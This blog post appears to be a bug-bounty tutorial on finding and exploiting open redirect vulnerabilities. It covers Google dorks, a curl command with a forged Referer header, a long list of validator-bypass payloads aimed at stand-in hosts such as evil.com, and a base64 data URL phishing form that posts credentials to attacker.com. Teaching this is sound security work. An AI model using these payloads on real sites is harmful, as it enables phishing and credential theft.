---
layout: post
title: Open Redirects 
date: 2023-08-16
categories: [cybersecurity, web-security, open-redirects]
---
## Open Redirect

An open redirect is a type of web vulnerability that allows an attacker  to redirect users to malicious websites. 

### URL-Based Open Redirect Attack

For example, if you receive an email from someone claiming to be your bank, and the link in the email looks like this:

[https://yourbank.com/redirect?goto=https://fakebank.com]


You might think that the link is safe because it starts with your bank’s domain name. However, if your bank’s website has an open redirect vulnerability, it will not check whether the URL after the “goto=” parameter is valid or not. Instead, it will simply redirect you to the fake bank website, where the attacker can try to steal your personal or financial information.



### Referer-Based Open Redirect Attack

An example of the HTTP request for a referer-based open redirect is as follows:

1. The attacker creates a fake website that looks like a popular social media platform, such as Facebook or Twitter. The fake website has a link that looks like this:
```html
<a href="https://example.com/login">Click here to log in to example.com</a>
```
The victim visits the attacker’s website and clicks on the link. The victim’s browser sends an HTTP request to example.com with the following headers:
```http
GET /login HTTP/1.1
Host: example.com
Referer: https://attacker.com
```
The `Referer` header tells example.com that the request came from attacker.com. If example.com uses a referer-based redirect system, it will not validate the destination URL after the login action, and will redirect the victim to the referer URL, which is attacker.com. The victim’s browser will receive an HTTP response like this:
```http
HTTP/1.1 302 Found
Location: https://attacker.com
```
The `Location` header tells the victim’s browser to go to attacker.com. The victim will be redirected to the attacker’s website, where the attacker can try to steal their information, infect them with malware, or perform other attacks

## Hunting for Open Redirects

### Step 1: Search for Redirect Parameters

1. Look for parameters used in redirects, often appearing as URL parameters:
   - `https://example.com/login?redirect=https://example.com/dashboard`
   - `https://example.com/login?redir=https://example.com/dashboard`
   - `https://example.com/login?next=https://example.com/dashboard`
   - `https://example.com/login?next=/dashboard`

2. Use a proxy while browsing the website and inspect the HTTP history.
3. Identify parameters containing absolute or relative URLs.
   - `Absolute URLs` are complete with URL scheme, hostname, and path (e.g., `https://example.com/login`).
   - `Relative URLs` only have the path component (e.g., `/login`).
   - Some redirect URLs might omit the initial slash (e.g., `https://example.com/login?next=dashboard`).

4. Note that redirect parameters might have diverse names like `RelayState`, `next`, `u`, `n`, and `forward`. Record all potential redirect-related parameters.

5. Observe pages without redirect parameters in their URLs that still automatically redirect users. Look for 3XX response codes (e.g., 301, 302) which indicate redirects.

### Step 2: Use Google Dorks to Find Additional Redirect Parameters
Start by setting your site in the url :

`site:example.com`

Then look for pages that contain URLs in their URL parameters, making use of `%3D`, the url encoded version of ( = )

The following searches for URL parameters that contain absolute URLs: `inurl:%3Dhttp site:example.com`

This search term might find the following pages:

https://example.com/login?next=https://example.com/dashboard

https://example.com/login?u=http://example.com/settings

Also try using `%2F`, the URL-encoded version of the slash (/). The following search term searches URLs that contain `=/`, and therefore returns URL parameters that contain relative URLs:

`inurl:%3D%2F site:example.com`

This search term will find URLs such as this one: https://example.com/login?n=/dashboard

Alternatively, you can search for the names of common URL redirect parameters.
```
inurl:redir site:example.com
inurl:redirect site:example.com
inurl:redirecturi site:example.com
inurl:redirect_uri site:example.com
inurl:redirecturl site:example.com
inurl:redirect_uri site:example.com
inurl:return site:example.com
inurl:returnurl site:example.com
inurl:relaystate site:example.com
inurl:forward site:example.com
inurl:forwardurl site:example.com
inurl:forward_url site:example.com
inurl:url site:example.com
inurl:uri site:example.com
inurl:dest site:example.com
inurl:destination site:example.com
inurl:next site:example.com
```
These search terms will find URLs such as the following:
```
https://example.com/logout?dest=/
https://example.com/login?RelayState=https://example.com/home
https://example.com/logout?forward=home
https://example.com/login?return=home/settings
```
## Testing for Parameter-Based and Referer-Based Open Redirects

### Step 3: Testing Parameter-Based Open Redirects

1. For each redirect parameter you've identified, test for open redirects by inserting a random or your owned hostname into the redirect parameter:
```
https://example.com/login?n=http://google.com
https://example.com/login?n=http://attacker.com
```

2. Some sites will redirect immediately, while others require user actions like registration, login, or logout before the redirect triggers. Make sure to carry out the necessary interactions before checking for redirects.

### Step 4: Testing Referer-Based Open Redirects

1. Test for referer-based open redirects on pages found in step 1 that redirect users without a redirect URL parameter.

2. Create an HTML page on a domain you own and host the following content, replacing the linked URL with the target page:
`<a href="https://example.com/login">Click on this link!</a>`

Reload and visit your HTML page. Click the link and observe if you are redirected to your site automatically or after necessary user interactions.


## Open Redirect Vulnerabilities and Complex URL Validation

they're challenging to prevent due to the complexity of URL validation.


- URL validation is the process of determining the legitimacy of a destination URL.
- URL components, like scheme, userinfo, hostname, port, path, query, and fragment, complicate validation.
- Example URL: `https://user:password:8080/example.com@attacker.com`
- Components: Scheme: https, Userinfo: user:password:8080, Hostname: example.com@attacker.com.
- Malformed URLs like these are ambiguous and prone to different browser interpretations.
- Chrome may redirect to `attacker.com `while Firefox redirects to `example.com.`

## Using Browser Autocorrect

You can leverage browser autocorrect features to generate alternative URLs that redirect offsite. Modern browsers often autocorrect URLs with incorrect components due to user typos. For instance, Chrome interprets these URLs as pointing to `https://attacker.com`:
- `https:attacker.com`
- `https;attacker.com`
- `https:\/\/attacker.com`
- `https:/\/\attacker.com`

These peculiarities can help bypass URL validation based on a blocklist. For example, if the validator rejects redirect URLs containing `https://` or `http://`, using an alternative string like `https;` can achieve the same outcome.

Most modern browsers also automatically correct backslashes (`\`) to forward slashes (`/`), treating these URLs as equivalent:
- `https:\\example.com`
- `https://example.com`

However, if the validator fails to recognize this behavior, inconsistencies might lead to bugs. For instance, the URL `https://attacker.com\@example.com` could be problematic. If the browser autocorrects the backslash to a forward slash, it redirects to `attacker.com`, treating `@example.com` as the path.

## Exploiting Flawed Validator Logic

An alternative approach to bypass the open-redirect validator is by exploiting weaknesses in the validator’s logic. For example, many URL validators aim to prevent open redirects by checking if the redirect URL `starts with, contains, or ends with the site’s domain name.` This can be evaded by crafting a subdomain or directory with the target's domain name:
- `https://example.com/login?redir=http://example.com.attacker.com`
- `https://example.com/login?redir=http://attacker.com/example.com`

To counter such attacks, the validator might accept only URLs that both commence and conclude with a domain listed on the allowlist. However, it’s possible to construct a URL adhering to both rules. Consider this example:
- `https://example.com/login?redir=https://example.com.attacker.com/example.com`

This URL redirects to attacker.com, despite beginning and ending with the target domain. The browser interprets the first `example.com` as a subdomain and the second as a filepath.

Another tactic is to utilize the at symbol (`@`) to make the first `example.com` the username part of the URL:
- `https://example.com/login?redir=https://example.com@attacker.com/example.com`

Custom-built URL validators are vulnerable to such attacks due to incomplete consideration of edge cases by developers.

## Using Data URLs to Bypass Open Redirect Validation

One method to bypass open redirect validation is by utilizing data URLs. Data URLs embed data directly within the URL, rather than referencing a server resource. The format of data URLs is as follows:

`data:[<media type>][;base64],<data>`

- `<media type>` is optional and specifies the MIME type of the data.
- The `base64` flag indicates if the data is encoded in base64.
- `<data>` is the actual content, which can be text, HTML, JavaScript, etc.

For instance, this data URL presents a simple HTML page displaying "Hello, world!":

`data:text/html,<h1>Hello, world!</h1>`

If a website fails to properly validate destination URLs, an attacker can exploit a data URL to redirect users to a malicious page resembling the legitimate site. For instance, given a redirect parameter like:

`https://example.com/login?redirect=https://example.com/dashboard`

An attacker can manipulate it to:

`https://example.com/login?redirect=data:text/html;base64,PGh0bWw+PGhlYWQ+PHRpdGxlPkV4YW1wbGUgRGFzaGJvYXJkPC90aXRsZT48L2hlYWQ+PGJvZHk+PGgxPlBsZWFzZSBsb2cgaW4gYWdhaW48L2gxPjxmb3JtIGFjdGlvbj0iaHR0cHM6Ly9hdHRhY2tlci5jb20vbG9naW4iIG1ldGhvZD0icG9zdCI+PHBsYWJlbD5Vc2VybmFtZTo8L3BsYWJlbD48aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0idXNlcm5hbWUiPjwvaW5wdXQ+PHBsYWJlbD5QYXNzd29yZDo8L3BsYWJlbD48aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5hbWU9InBhc3N3b3JkIj48L2lucHV0PjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJMb2dpbiI+PC9pbnB1dD48L2Zvcm0+PC9ib2R5PjwvaHRtbD4=`

This data URL contains a base64-encoded HTML page that mimics the example dashboard and asks the user to log in again. The form action points to `attacker.com/login`, where the attacker can capture the user’s credentials. The user may not notice the difference between the real and fake dashboard, and may enter their credentials again.

## Exploiting URL Decoding

URLs transmitted over the internet are constrained to ASCII characters, necessitating URL encoding for characters outside this range. URL encoding involves converting a character into a percentage sign followed by two hex digits, like `%2f` for a slash character.

- Validators and browsers decode URL-encoded characters before processing URLs.
- Mismatches in decoding between validators and browsers can be exploited for open redirects.

### Double Encoding

- Double or triple URL-encode specific special characters in payloads.
- For example, URL-encode a slash as `%2f`: `https://example.com%2f@attacker.com`.
- Double URL-encode the slash: `https://example.com%252f@attacker.com`.
- Triple URL-encode the slash: `https://example.com%25252f@attacker.com`.

### Non-ASCII Characters

- Exploit inconsistencies in non-ASCII character decoding by validators and browsers.
- Example with `%ff` representing ÿ, a non-ASCII character:
  - Validator: example.com domain, attacker.comÿ subdomain.
  - Browser might decode non-ASCII as '?', navigating to attacker.com: `https://attacker.com?.example.com`.
- Browsers often attempt to find similar characters:
  - Validator: example.com domain with `%E2%95%B1` symbol.
  - Browser converts symbol to a slash, making attacker.com domain: `https://attacker.com/.example.com`.

### Unicode and Cyrillic Characters

- Unicode provides codes for world languages.
- Utilize Unicode characters for look-alike symbols, bypassing filters.
- Cyrillic character set is useful due to its ASCII-like characters.

## Steps to Find Open Redirects

To identify open redirects, follow these steps:

1. **Search for Redirect URL Parameters:**
   - Look for URL parameters that control redirect destinations.
   - Example: `https://example.com/login?redirect=https://example.com/dashboard`
   - Test by changing the parameter value to your own, a non-existent, or a malicious domain.
     Example: `https://example.com/login?redirect=https://attacker.com`
   - If destination URL validation is insufficient, you'll be redirected to the specified domain.

2. **Identify Referer-Based Redirects:**
   - Locate pages that automatically redirect based on the referer URL after user actions like login or logout.
   - Referer is an HTTP request header indicating the origin of the request.
   - Monitor 3XX response codes (301, 302) or use tools like [Burp Suite] or [ZAP] to track redirection flow.

3. **Testing Referer-Based Redirects:**
   - Utilize tools like [curl] or [Postman] to send HTTP requests with various referer headers.
   - Test with your own, non-existent, or malicious domain.
   - Example: `curl -H "Referer: https://attacker.com" https://example.com/login`
   - Inadequate destination URL validation redirects to the specified domain.

## another reference:

## How to exploit
1. Try change the domain
```
/?redir=evil.com
```

2. Using a whitelisted domain or keyword
```
/?redir=target.com.evil.com
```

3. Using `//` to bypass `http` blacklisted keyword
```
/?redir=//evil.com
```

4. Using `https:` to bypass `//` blacklisted keyword
```
/?redir=https:evil.com
```

5. Using `\\` to bypass `//` blacklisted keyword
```
/?redir=\\evil.com
```

6. Using `\/\/` to bypass `//` blacklisted keyword
```
/?redir=\/\/evil.com/
/?redir=/\/evil.com/
```

7. Using `%E3%80%82` to bypass `.` blacklisted character
```
/?redir=evil。com
/?redir=evil%E3%80%82com
```

8. Using null byte `%00` to bypass blacklist filter
```
/?redir=//evil%00.com
```

9. Using parameter pollution
```
/?next=target.com&next=evil.com
```

10. Using `@` or `%40` character, browser will redirect to anything after the `@`
```
/?redir=target.com@evil.com
/?redir=target.com%40evil.com
```

11. Creating folder as their domain
```
http://www.yoursite.com/http://www.theirsite.com/
http://www.yoursite.com/folder/www.folder.com
```

12.  Using `?` characted, browser will translate it to `/?`
```
/?redir=target.com?evil.com
```

13. Bypass the filter if it only checks for domain name using `%23`
```
/?redir=target.com%23evil.com
```

14.  Host/Split Unicode Normalization
```
https://evil.c℀.example.com
```

15. Using parsing
```
http://ⓔⓥⓘⓛ.ⓒⓞⓜ
```

16. Using `°` symbol to bypass
```
/?redir=target.com/°evil.com
```

17. Bypass the filter if it only allows yoou to control the path using a nullbyte `%0d` or `%0a`
```
/?redir=/%0d/evil.com
```
